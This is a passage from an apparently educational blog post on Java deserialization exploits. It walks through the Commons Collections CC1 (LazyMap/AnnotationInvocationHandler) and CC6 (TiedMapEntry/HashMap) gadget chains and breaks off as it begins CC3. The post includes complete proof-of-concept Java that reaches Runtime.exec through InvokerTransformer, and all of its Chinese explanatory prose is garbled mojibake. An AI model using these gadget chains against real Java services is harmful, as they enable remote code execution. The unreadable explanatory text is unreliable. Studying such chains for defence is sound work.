java.reflect.Proxy ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> </span><br><span class="line"><span class="title class_">Class</span>[] &#123;Map.class&#125;, handler);</span><br></pre></td></tr></table></figure><p>Proxy.newProxyInstance çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ClassLoaderï¼Œæˆ‘ä»¬ç”¨é»˜è®¤çš„å³å¯ï¼›ç¬¬äºŒä¸ªå‚æ•°æ˜¯æˆ‘ä»¬éœ€è¦ ä»£ç†çš„å¯¹è±¡é›†åˆï¼›ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå®ç°äº†InvocationHandleræ¥å£çš„å¯¹è±¡ï¼Œé‡Œé¢åŒ…å«äº†å…·ä½“ä»£ç†çš„é€» è¾‘ã€‚ æ¯”å¦‚ï¼Œæˆ‘ä»¬å†™è¿™æ ·ä¸€ä¸ªç±»ExampleInvocationHandlerï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> vulhub;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExampleInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> Map map;</span><br><span class="line">    <span class="keyword">public</span>  <span class="title function_">ExampleInvocationHandler</span><span class="params">(Map map)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">if</span>(method.getName().compareTo(<span class="string">&quot;get&quot;</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hook method: &quot;</span>+ method.getName());</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;hacked Object&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> method.invoke(<span class="built_in">this</span>.map,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> vulhub;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExampleTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExampleInvocationHandler</span>(<span class="keyword">new</span> <span class="title class_">HashMap</span>());</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Map.class&#125;, handler);</span><br><span class="line">        proxyMap.put(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> (String)proxyMap.get(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹æ‰§è¡Œç»“æœï¼Œæˆ‘ä»¬èƒ½å‘ç°æˆ‘ä»¬æ˜æ˜ä¼ è¿›Mapæ˜¯testå€¼ä¸ºxxxï¼Œä½†æ˜¯æˆ‘ä»¬è·å–åˆ°çš„ç»“æœå´æ˜¯hacked Objectã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714555123018-c1afff61-6e34-4b50-b9b3-44b2ec105dfc.png"></p><p>è¿™é‡Œç”¨è‡ªå·±çš„è¯è§£é‡Šè¿™ä¸ªåŠ¨æ€ä»£ç†çš„åº”ç”¨åŸç†ï¼Œå°±æ˜¯è¯´æˆ‘ä»¬ä½¿ç”¨è¿™ä¸ªProxy.newProxyInstanceè¿™ä¸ªç±»å»ä»£ç†ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œè¿™ä¸ªå¯¹è±¡è°ƒç”¨ä»»æ„æ–¹æ³•éƒ½ä¼šè§¦å‘æˆ‘ä»¬ä¼ å…¥çš„InvocationHandlerå¯¹è±¡çš„invokeæ–¹æ³•ã€‚</p><p>AnnotationInvocationHandlerï¼Œè¿™ä¸ªç±»å®é™…å°±æ˜¯ä¸€ä¸ªInvocationHandlerï¼Œå°†è¿™ä¸ªå¯¹è±¡ç”¨Proxyè¿›è¡Œä»£ç†ï¼Œé‚£ä¹ˆåœ¨readObjectçš„æ—¶å€™ï¼Œåªè¦è°ƒç”¨ä»»æ„çš„æ–¹æ³•ã€‚å°±ä¼šè‡ªåŠ¨è°ƒç”¨åˆ° AnnotationInvocationHandler#invoke æ–¹æ³•ï¼Œè¿›è€Œè§¦å‘æˆ‘ä»¬çš„LazyMap#getã€‚æˆ‘ä»¬å¯ä»¥è°ƒè¯•çœ‹çœ‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714555448211-7a496371-98f0-4bbb-9127-807b894099ce.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714555530093-2cf6708d-98cf-4b2e-a9e8-d19352f653ba.png"></p><p>åœ¨è¿™é‡Œå‘ç°membervaluesè°ƒç”¨entysetæ–¹æ³•æ—¶è°ƒç”¨äº†invokeæ–¹æ³•ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ å‡ºLazyMapçš„åˆ©ç”¨é“¾</p><p>é¦–å…ˆä½¿ç”¨LazyMapæ›¿æ¢TransformedMapã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br></pre></td></tr></table></figure><font style="color:rgba(0, 0, 0, 0.9);">  </font>ç„¶åé€šè¿‡åå°„è·å–<p>sun.reflect.annotation.AnnotationInvocationHandler</p><p>è¿™ä¸ªå†…éƒ¨ç±»ï¼Œç„¶åè¿›è¡Œå¯¹å…¶è¿›è¡ŒProxyã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Map.class&#125;, handler);</span><br></pre></td></tr></table></figure><p>ä»£ç†åçš„å¯¹è±¡å«åšproxyMapï¼Œä½†æˆ‘ä»¬ä¸èƒ½ç›´æ¥å¯¹å…¶è¿›è¡Œåºåˆ—åŒ–ï¼Œå› ä¸ºæˆ‘ä»¬å…¥å£ç‚¹æ˜¯ï¼š</p><p>sun.reflect.annotation.AnnotationInvocationHandler#readObjectï¼Œ</p><p>æ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦å†ç”¨AnnotationInvocationHandlerå¯¹è¿™ä¸ªproxyMapè¿›è¡ŒåŒ…è£¹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);</span><br></pre></td></tr></table></figure><p>å®Œæ•´çš„poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//lazymap</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Map.class&#125;, handler);</span><br><span class="line"></span><br><span class="line">        handler = (InvocationHandler)construct.newInstance(Retention.class, proxyMap);</span><br></pre></td></tr></table></figure><h3 id="cc1-LazyMapè°ƒç”¨é“¾"><a href="#cc1-LazyMapè°ƒç”¨é“¾" class="headerlink" title="cc1 LazyMapè°ƒç”¨é“¾"></a>cc1 LazyMapè°ƒç”¨é“¾<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714669450577-aff3a171-9f0e-43f0-9a76-c5966722e65b.png"></h3><h2 id="5-java-cc6é“¾"><a href="#5-java-cc6é“¾" class="headerlink" title="5.java cc6é“¾"></a>5.java cc6é“¾</h2><p>åœ¨ysoserialä¸­ï¼ŒCommonsCollections6å¯ä»¥è¯´æ˜¯commons-collectionsè¿™ä¸ªåº“ä¸­ç›¸å¯¹â½è¾ƒé€šâ½¤çš„åˆ©â½¤ é“¾ï¼Œä¸ºäº†è§£å†³â¾¼ç‰ˆæœ¬Javaçš„åˆ©â½¤é—®é¢˜ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹çœ‹è¿™ä¸ªåˆ©â½¤é“¾ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc6_test</span> &#123;</span><br><span class="line">    <span class="comment">//å®šä¹‰åºåˆ—åŒ–æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å®šä¹‰ååºåˆ—åŒ–æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectInputStream objectInputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] fake_transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fake_transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorate</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">key</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(decorate, <span class="string">&quot;key&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(key,<span class="string">&quot;sss&quot;</span>);</span><br><span class="line">        decorate.remove(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chainedTransformer, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//serialize(hashMap);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç”±äºåœ¨java  8u71ï¼Œè¿™ä¸ªåˆ©â½¤é“¾ä¸èƒ½å†åˆ©â½¤äº†ï¼Œä¸»è¦åŸå›  æ˜¯sun.reflect.annotation.AnnotationInvocationHandler#readObject çš„é€»è¾‘å˜åŒ–äº†ã€‚</p><p>ysoserialä½œè€…æ‰¾åˆ°äº†å¦ä¸€æ¡èƒ½å¤Ÿè§¦å‘lazymapçš„æ–¹æ³•ï¼Œå°±æ˜¯TiedMapEntryè¿™ä¸ªç±»ä¸­çš„getValueæ–¹æ³•ä¸­è°ƒç”¨äº†getæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714631173688-6b2f4fa3-9729-4e57-a6d4-ffcde6469ec7.png"></p><p>åœ¨å…¶åŒç±»ä¸­çš„hashcodeæ–¹æ³•è°ƒç”¨äº†getæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714631197142-e2200442-a755-48e6-bbd1-283141a6b22b.png"></p><p>æ‰€ä»¥æˆ‘ä»¬æƒ³è¦è¿›è¡Œrceå°±éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥è§¦å‘hashcodeçš„æ–¹æ³•ï¼Œåœ¨URLDNSé“¾ä¸­æˆ‘ä»¬çŸ¥é“hashmapçš„readobjectä¸­è°ƒç”¨äº†hashæ–¹æ³•ï¼Œè€Œå…¶hashæ–¹æ³•ä¸­åˆè°ƒç”¨äº†hashcodeæ–¹æ³•ï¼Œæ‰€ä»¥è°ƒç”¨é“¾å°±å‡ºæ¥äº†ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] fake_transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fake_transformers);</span><br><span class="line"><span class="type">Map</span> <span class="variable">decorate</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), chainedTransformer);</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">key</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(decorate, <span class="string">&quot;key&quot;</span>);</span><br><span class="line">HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">hashMap.put(key,<span class="string">&quot;sss&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">f.set(chainedTransformer, transformers);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”±äºhasmapåœ¨putçš„æ—¶å€™ä¹Ÿä¼šè°ƒç”¨hashæ–¹æ³•æ‰€ä»¥æˆ‘ä»¬å…ˆç”¨ä¸€ä¸ªå‡çš„invokertransformerè¿›è¡Œputç„¶ååœ¨åå°„ä¿®æ”¹æˆçœŸçš„å°±ä¸ä¼šåœ¨putçš„æ—¶å€™è§¦å‘äº†ï¼Œä½†æ˜¯æˆ‘ä»¬è¿™æ ·ååºåˆ—åŒ–è¿è¡Œåå‘ç°ä¹Ÿæ²¡æœ‰è§¦å‘ï¼Œè¿™æ˜¯ä»€ä¹ˆåŸå› ï¼Œæˆ‘ä»¬è·Ÿè¿›æ¥çœ‹çœ‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714631432833-aa4fdbc8-ce47-40e3-9f90-21c1541abfdd.png">æˆ‘ä»¬å‘ç°åœ¨lazymapä¸­å¹¶æ²¡æœ‰è¿›å…¥ifæ¡ä»¶ï¼Œè¿™è¯´æ˜keyè¢«ä¼ å…¥äº†ï¼Œä½†æ˜¯æˆ‘ä»¬å¹¶æ²¡æœ‰ç»™lazymaoä¼ å…¥å€¼ï¼Œè¿™é‡Œé€šè¿‡è°ƒè¯•å‘ç°æˆ‘ä»¬åœ¨hashmapè¿›è¡Œputçš„æ—¶å€™è¿›å…¥lazymapçš„ifæ¡ä»¶ä¹‹åå¦‚æœæ²¡æœ‰keyå€¼ä»–æ˜¯ä¼šåœ¨è¿›è¡Œputè¿›å»çš„æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦åœ¨putä¹‹ååœ¨è¿›è¡Œåˆ é™¤å³å¯pocå¦‚å¼€å¤´ã€‚</p><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/weixin_49125123/article/details/135232651">https://blog.csdn.net/weixin_49125123&#x2F;article&#x2F;details&#x2F;135232651</a> <a href="https://www.yuque.com/attachments/yuque/0/2024/pdf/25729212/1714631644198-f098a5bc-21e1-44bd-ad0f-51db9c50d07f.pdf">Javaå®‰å…¨æ¼«è°ˆ - 12.ååºåˆ—åŒ–ç¯‡(6).pdf</a></p><h3 id="cc6è°ƒç”¨é“¾"><a href="#cc6è°ƒç”¨é“¾" class="headerlink" title="cc6è°ƒç”¨é“¾"></a>cc6è°ƒç”¨é“¾</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714668463375-9a53c70d-4ae7-414f-a145-96b13370c7c6.png"></p><h2 id="6-java-cc3é“¾"><a href="#6-java-cc3é“¾" class="headerlink" title="6.java cc3é“¾"></a>6.java cc3é“¾</h2><p>cc3ç”¨çš„æ˜¯åŠ¨æ€åŠ è½½å­—èŠ‚ç çš„å½¢å¼è¿›è¡Œçš„rceå¯ä»¥å‚è€ƒè‡ªå·±è®°å¾—<a href="https://www.yuque.com/zqiangweihuakai/kb/qlir1pya36gtghqn">åŠ¨æ€åŠ è½½å­—èŠ‚ç </a>çš„ç¬”è®°æ¥äº†è§£ã€‚</p><p>è¯¥é“¾ä¸»è¦æ˜¯åˆ©ç”¨äº†TemplatesImplè¿™ä¸ªç±»è¿›è¡Œå­—èŠ‚ç åŠ è½½ã€‚é€šè¿‡ç¬”è®°æˆ‘ä»¬äº†è§£åˆ°javaåŠ è½½.classçš„æ ¸å¿ƒä»£ç å°±æ˜¯defineclassæ–¹æ³•ï¼Œè€Œé€šè¿‡è°ƒè¯•å‘ç°TemplatesImplè¿™ä¸ªç±»ä¸­å®šä¹‰äº†ä¸€ä¸ªå†…éƒ¨ç±»é‡å†™äº†defineclassæ–¹æ³•å¹¶ä¸”è¿™é‡Œæ²¡æœ‰æ˜¾å¼åœ°å£°æ˜å…¶å®šä¹‰åŸŸã€‚Javaä¸­é»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœä¸€ä¸ª 